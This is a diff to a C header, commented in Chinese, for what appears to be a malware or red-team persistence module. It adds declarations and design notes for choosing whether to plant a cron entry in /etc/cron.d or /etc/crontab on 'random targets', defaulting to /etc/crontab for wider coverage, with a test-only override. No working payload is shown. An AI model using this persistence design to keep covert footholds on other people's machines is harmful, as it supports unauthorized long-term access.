@@ -61,6 +61,33 @@ int persist_set_service_name(const char *name);
 /* 读取当前生效的服务名（默认保留历史值以不破坏既有测试语义） */
 const char *persist_service_name(void);
 
+/* ---- cron 落点形态：能力探测 + 回退 ----
+ *
+ * /etc/cron.d **不是通用特性**，而是 Debian/RHEL 的发行版补丁：上游真 Vixie
+ * cron 不扫描它。实测对照：/etc/cron.d 下契约全合规的条目从未执行，而
+ * /etc/crontab 的条目每分钟真触发。危害是"条目写了、部署全绿、永不执行"，
+ * 与驻留成功完全无法区分。
+ *
+ * 故驻留必须按目标探测选落点：
+ *   1 = /etc/cron.d/<name>（确认支持该目录的发行版）
+ *   0 = /etc/crontab      （通用路径，带 user 字段、按 marker 管理）
+ *
+ * 默认在未知发行版上取 0：/etc/crontab 是 cron 最古老的机制，覆盖面最广；
+ * 只有明确确认支持才用 cron.d。随机目标上"未知"更可能是 BSD/嵌入式/小众
+ * Linux，这些更可能不支持 cron.d。
+ *
+ * persist_set_cron_impl() 是显式覆盖位，仅服务于守卫 —— "不支持 cron.d"
+ * 这条分支在 Debian/RHEL 系机器上永远走不到，不能强制进入就等于没写。
+ * 生产环境从不调用。成功 0，非法值 -1。
+ *
+ * persist_cron_impl() 返回当前生效形态（root_prefix 为 NULL 时查真实根），
+ * 供守卫断言，避免守卫自己复算判据而与实际落点脱节。 */
+#define PERSIST_CRON_IMPL_SYSCRONTAB 0   /* /etc/crontab        —— 通用路径   */
+#define PERSIST_CRON_IMPL_CROND      1   /* /etc/cron.d/<name>  —— 发行版补丁 */
+
+int persist_set_cron_impl(int impl);
+int persist_cron_impl(const char *root_prefix);
+
 size_t persist_method_count(void);
 const persist_desc_t *persist_method_at(size_t i);
 
